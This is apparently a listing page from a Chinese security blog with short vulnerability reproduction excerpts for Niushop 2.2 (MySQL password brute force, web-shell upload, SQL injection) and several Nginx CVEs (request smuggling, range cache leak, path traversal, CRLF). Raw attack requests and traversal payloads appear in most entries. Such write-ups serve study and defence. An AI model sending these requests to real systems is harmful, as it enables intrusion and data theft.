@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/57/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Niushop/Niushop 单商户 2.2 爆破MySQL密码" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Niushop/Niushop%20%E5%8D%95%E5%95%86%E6%88%B7%202.2%20%E7%88%86%E7%A0%B4MySQL%E5%AF%86%E7%A0%81/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.372Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Niushop-单商户-2-2-爆破MySQL密码"><a href="#Niushop-单商户-2-2-爆破MySQL密码" class="headerlink" title="Niushop 单商户 2.2 爆破MySQL密码"></a>Niushop 单商户 2.2 爆破MySQL密码</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Version：单商户 2.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="安装爆破MySQL密码"><a href="#安装爆破MySQL密码" class="headerlink" title="安装爆破MySQL密码"></a>安装爆破MySQL密码</h3><pre><code>GET /niushop/install.php?action=true&amp;dbserver=127.0.0.1&amp;dbpassword=root2&amp;dbusername=root&amp;dbname=niushop_b2c HTTP/1.1
+Host: 127.0.0.1
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
+Referer: http://127.0.0.1/niushop/install.php?refresh
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: action=db
+Connection: close
+</code></pre>
+<p><img src="/resource/Niushop%E5%8D%95%E5%95%86%E6%88%B72.2%E7%88%86%E7%A0%B4MySQL%E5%AF%86%E7%A0%81/media/rId25.jpg"></p>
+<p>爆破成功返回1，密码错误返回0</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Niushop/Niushop%20%E5%8D%95%E5%95%86%E6%88%B7%202.2%20%E7%88%86%E7%A0%B4MySQL%E5%AF%86%E7%A0%81/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Niushop/Niushop%20%E5%8D%95%E5%95%86%E6%88%B7%202.2%20%E7%88%86%E7%A0%B4MySQL%E5%AF%86%E7%A0%81/" data-id="cl5c2qt0d00cfy8v1e0zbgzl6" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Niushop/Niushop 单商户 2.2 前台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Niushop/Niushop%20%E5%8D%95%E5%95%86%E6%88%B7%202.2%20%E5%89%8D%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.370Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Niushop-单商户-2-2-前台getshell"><a href="#Niushop-单商户-2-2-前台getshell" class="headerlink" title="Niushop 单商户 2.2 前台getshell"></a>Niushop 单商户 2.2 前台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Version：单商户 2.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="/resource/Niushop%E5%8D%95%E5%95%86%E6%88%B72.2%E5%89%8D%E5%8F%B0getshell/media/rId24.jpg"></p>
+<p>上传图片只做了前端校验，抓包改后缀即可绕过。</p>
+<p>对文件内容做了检查，文件大小不能过大或过小，合成马最好放到中间。</p>
+<p>请求包截图，删除不必要的参数仍旧能够上传。</p>
+<p><img src="/resource/Niushop%E5%8D%95%E5%95%86%E6%88%B72.2%E5%89%8D%E5%8F%B0getshell/media/rId25.jpg"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Niushop/Niushop%20%E5%8D%95%E5%95%86%E6%88%B7%202.2%20%E5%89%8D%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Niushop/Niushop%20%E5%8D%95%E5%95%86%E6%88%B7%202.2%20%E5%89%8D%E5%8F%B0getshell/" data-id="cl5c2qt0d00cey8v10r5p4nl6" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Niushop/Niushop sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Niushop/Niushop%20sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.368Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Niushop-sql注入"><a href="#Niushop-sql注入" class="headerlink" title="Niushop sql注入"></a>Niushop sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="sql注入（一）"><a href="#sql注入（一）" class="headerlink" title="sql注入（一）"></a>sql注入（一）</h3><h4 id="order参数："><a href="#order参数：" class="headerlink" title="order参数："></a>order参数：</h4><pre><code>http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&amp;brand_id=2&amp;min_price=3&amp;max_price=4&amp;page=5&amp;page_size=6&amp;order=7%27&amp;attr_array[][2]=8&amp;spec_array[]=9
+</code></pre>
+<h4 id="attr-array参数："><a href="#attr-array参数：" class="headerlink" title="attr_array参数："></a>attr_array参数：</h4><pre><code>http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&amp;brand_id=2&amp;min_price=3&amp;max_price=4&amp;page=5&amp;page_size=6&amp;order=7&amp;attr_array[][2]=8%27&amp;spec_array[]=9
+</code></pre>
+<h4 id="直接上sqlmap"><a href="#直接上sqlmap" class="headerlink" title="直接上sqlmap"></a>直接上sqlmap</h4>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Niushop/Niushop%20sql%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Niushop/Niushop%20sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qt0b00cdy8v13vzf9e53" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Nginx/（CVE-2020-12440）Nginx _= 1.8.0 请求走私" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Nginx/%EF%BC%88CVE-2020-12440%EF%BC%89Nginx%20_=%201.8.0%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.296Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-12440）Nginx-lt-1-8-0-请求走私"><a href="#（CVE-2020-12440）Nginx-lt-1-8-0-请求走私" class="headerlink" title="（CVE-2020-12440）Nginx &lt;= 1.8.0 请求走私"></a>（CVE-2020-12440）Nginx &lt;= 1.8.0 请求走私</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Nginx<br>1.18.0及之前版本中存在安全漏洞。攻击者可利用该漏洞进行缓存投毒，劫持凭证或绕过安全保护。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Nginx &lt;= 1.8.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="/resource/(CVE-2020-12440)Nginx%3C=1.8.0%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/media/rId24.jpg" alt="1589967192.jpg"></p>
+<h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><pre><code>GET /test.html HTTP/1.1
+Host: www.0-sec.org
+Content-Length: 2
+
+GET /poc.html HTTP/1.1
+Host: www.0-sec.org
+Content-Length: 15
+</code></pre>
+<h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Nginx/%EF%BC%88CVE-2020-12440%EF%BC%89Nginx%20_=%201.8.0%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Nginx/%EF%BC%88CVE-2020-12440%EF%BC%89Nginx%20_=%201.8.0%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" data-id="cl5c2qt0g00coy8v169nv0hdm" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Nginx/（CVE-2019-20372）Nginx error_page 请求走私漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Nginx/%EF%BC%88CVE-2019-20372%EF%BC%89Nginx%20error_page%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.294Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-20372）Nginx-error-page-请求走私漏洞"><a href="#（CVE-2019-20372）Nginx-error-page-请求走私漏洞" class="headerlink" title="（CVE-2019-20372）Nginx error_page 请求走私漏洞"></a>（CVE-2019-20372）Nginx error_page 请求走私漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Nginx 1.17.7之前版本中 error_page<br>存在安全漏洞。攻击者可利用该漏洞读取未授权的Web页面。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Ngnix &lt; 1.17.7</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><blockquote>
+<p>错误配置</p>
+</blockquote>
+<pre><code>server &#123;
+ listen 80;
+ server_name localhost;
+ error_page 401 http://example.org;
+ location / &#123;
+ return 401;
+ &#125;
+&#125;
+server &#123;
+ listen 80;
+ server_name notlocalhost;
+ location /_hidden/index.html &#123;
+ return 200 &#39;This should be hidden!&#39;;
+ &#125;
+&#125;
+</code></pre>
+<p>这时候我们可以向服务器发送以下请求</p>
+<pre><code>GET /a HTTP/1.1
+Host: localhost
+Content-Length: 56
+GET /_hidden/index.html HTTP/1.1
+Host: notlocalhost
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Nginx/%EF%BC%88CVE-2019-20372%EF%BC%89Nginx%20error_page%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Nginx/%EF%BC%88CVE-2019-20372%EF%BC%89Nginx%20error_page%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qt0g00cmy8v1gnr95qmd" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Nginx/（CVE-2017-7529）Nginx 越界读取缓存漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Nginx/%EF%BC%88CVE-2017-7529%EF%BC%89Nginx%20%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.292Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-7529）Nginx-越界读取缓存漏洞"><a href="#（CVE-2017-7529）Nginx-越界读取缓存漏洞" class="headerlink" title="（CVE-2017-7529）Nginx 越界读取缓存漏洞"></a>（CVE-2017-7529）Nginx 越界读取缓存漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括”文件头”+”HTTP返回包头”+”HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的”HTTP返回包体”返回给用户。</p>
+<p>如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600,<br>-9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于”HTTP返回包体”前的”文件头”、”HTTP返回包头”等内容。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
+<li>  Nginx Nginx:1.13.2</li>
+<li>  Nginx Nginx:1.13.1</li>
+<li>  Nginx Nginx:1.13.0</li>
+<li>  Nginx Nginx:1.11.13</li>
+<li>  Nginx Nginx:1.11.12</li>
+</ul>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>运行测试环境：</p>
+<pre><code>docker-compose up -d
+</code></pre>
+<p>访问<code>http://www.0-sec.org:8080/</code>，即可查看到Nginx默认页面，这个页面实际上是反向代理的8081端口的内容。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Nginx/%EF%BC%88CVE-2017-7529%EF%BC%89Nginx%20%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Nginx/%EF%BC%88CVE-2017-7529%EF%BC%89Nginx%20%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qt0g00cny8v1gzgyh90r" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Nginx/（CVE-2016-1247）Nginx 提权漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Nginx/%EF%BC%88CVE-2016-1247%EF%BC%89Nginx%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.289Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2016-1247）Nginx-提权漏洞"><a href="#（CVE-2016-1247）Nginx-提权漏洞" class="headerlink" title="（CVE-2016-1247）Nginx 提权漏洞"></a>（CVE-2016-1247）Nginx 提权漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>漏洞原因是在打包nginx时，设置的日志目录的所有者为 www-data<br>，导致一个低权限账户可以利用软链接的帮助达到提权。所以修复也是将日志的所有者改为root即可。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Debian: Fixed in Nginx 1.6.2-5+deb8u3</p>
+<p>Ubuntu:</p>
+<p>Fixed in the following updated Nginx package versions on Ubuntu:</p>
+<p>Ubuntu 16.04 LTS: 1.10.0-0ubuntu0.16.04.3</p>
+<p>Ubuntu 14.04 LTS: 1.4.6-1ubuntu3.6</p>
+<p>Ubuntu 16.10: 1.10.1-0ubuntu1.1</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Nginx/%EF%BC%88CVE-2016-1247%EF%BC%89Nginx%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Nginx/%EF%BC%88CVE-2016-1247%EF%BC%89Nginx%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qt0f00cly8v15wmtadia" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Nginx/（CVE-2013-4547）Nginx URI Processing 安全绕过漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Nginx/%EF%BC%88CVE-2013-4547%EF%BC%89Nginx%20URI%20Processing%20%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.287Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2013-4547）Nginx-URI-Processing-安全绕过漏洞"><a href="#（CVE-2013-4547）Nginx-URI-Processing-安全绕过漏洞" class="headerlink" title="（CVE-2013-4547）Nginx URI Processing 安全绕过漏洞"></a>（CVE-2013-4547）Nginx URI Processing 安全绕过漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>nginx0.8.41至1.4.3版本和1.5.7之前的1.5.x版本中存在安全漏洞，该漏洞源于程序没有正确验证包含未转义空格字符的请求URI。远程攻击者可利用该漏洞绕过既定的限制。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。</p>
+<p>举个例子，比如，Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见的写法如下：</p>
+<pre><code>location ~ \.php$ &#123;
+    include        fastcgi_params;
+
+    fastcgi_pass   127.0.0.1:9000;
+    fastcgi_index  index.php;
+    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
+    fastcgi_param  DOCUMENT_ROOT /var/www/html;
+&#125;
+</code></pre>
+<p>正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Nginx/%EF%BC%88CVE-2013-4547%EF%BC%89Nginx%20URI%20Processing%20%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Nginx/%EF%BC%88CVE-2013-4547%EF%BC%89Nginx%20URI%20Processing%20%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qt0f00cky8v122ezcuc4" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Nginx/Nginx 配置错误漏洞 目录穿越漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Nginx/Nginx%20%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.284Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Nginx-配置错误漏洞-目录穿越漏洞"><a href="#Nginx-配置错误漏洞-目录穿越漏洞" class="headerlink" title="Nginx 配置错误漏洞 目录穿越漏洞"></a>Nginx 配置错误漏洞 目录穿越漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>Nginx在配置别名（Alias）的时候，如果忘记加<code>/</code>，将造成一个目录穿越漏洞。</p>
+<p>错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：</p>
+<pre><code>location /files &#123;
+    alias /home/;
+&#125;
+</code></pre>
+<p>Payload: <code>http://www.0-sec.org:8081/files../</code> ，成功穿越到根目录：</p>
+<p><img src="/resource/Nginx%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Nginx/Nginx%20%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Nginx/Nginx%20%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qt0f00cjy8v16zb77j6f" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Nginx/Nginx 配置错误漏洞 CRLF注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Nginx/Nginx%20%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%20CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.281Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Nginx-配置错误漏洞-CRLF注入漏洞"><a href="#Nginx-配置错误漏洞-CRLF注入漏洞" class="headerlink" title="Nginx 配置错误漏洞 CRLF注入漏洞"></a>Nginx 配置错误漏洞 CRLF注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>下面两种情景十分常见：</p>
+<ol>
+<li> 用户访问<code>http://www.0-sec.org/aabbcc</code>，自动跳转到<code>https://www.0-sec.org/aabbcc</code></li>
+<li> 用户访问<code>http://www.0-sec.org/aabbcc</code>，自动跳转到<code>http://www.0-sec.org/aabbcc</code></li>
+</ol>
+<p>比如我的博客，访问<code>http://www.0-sec.org/other/tinger.html</code>，将会301跳转到<code>https://www.0-sec.org/other/tinger.html</code>。随着现在https的普及，很多站点都强制使用https访问，这样的跳转非常常见。</p>
+<p>第二个场景主要是为了统一用户访问的域名，更加有益于SEO优化。</p>
+<p>在跳转的过程中，我们需要保证用户访问的页面不变，所以需要从Nginx获取用户请求的文件路径。查看Nginx文档，可以发现有三个表示uri的变量：</p>
+<ol>
+<li> <code>$uri</code></li>
+<li> <code>$document_uri</code></li>
+<li> <code>$request_uri</code></li>
+</ol>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Nginx/Nginx%20%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%20CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Nginx/Nginx%20%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%20CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qt0e00ciy8v156t31qno" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
